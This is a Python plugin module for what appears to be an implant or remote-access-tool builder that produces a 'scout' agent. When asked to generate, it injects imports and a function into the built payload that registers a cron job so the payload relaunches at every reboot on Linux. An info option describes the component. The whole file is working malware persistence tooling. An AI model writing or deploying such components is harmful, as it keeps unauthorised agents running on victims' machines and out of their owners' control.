# API
# done


def main(self, option):
    if option == 'generate':
        self.config.import_statements.append('from crontab import CronTab')
        self.config.import_statements.append('from getpass import getuser')
        self.config.import_statements.append('from os import path, getcwd')
        self.config.import_statements.append('from sys import argv')
        self.config.startup.append('cron_persist_startup()')
        self.config.functions.append('''
def cron_persist_startup():
    cron = CronTab(user=getuser())
    if path.join(getcwd(),path.abspath(argv[0]))[-3:] == '.py':
        job = cron.new(command='python ' + path.join(getcwd(),path.abspath(argv[0])))
    else:
        job = cron.new(command=path.join(getcwd(),path.abspath(argv[0])))
    job.every_reboot()
    cron.write()
''')
    elif option == 'info':
        self.log.blank('\nName             : Cron job persistence startup component' \
                       '\nOS               : Linux' \
                       '\nRequired Modules : python-crontab (External), getpass, os, sys' \
                       '\nCommands         : NIL (Runs at startup)' \
                       '\nDescription      : Create a cron job of the scout so it runs at startup\n')
        return {
            "Name": "Cron job persistence startup component",
            "OS": "Linux",
            "Required Modules": "python-crontab (External), getpass, os, sys",
            "Commands": "NIL (Runs at startup)",
            "Description": "Create a cron job of the scout so it runs at startup"
        }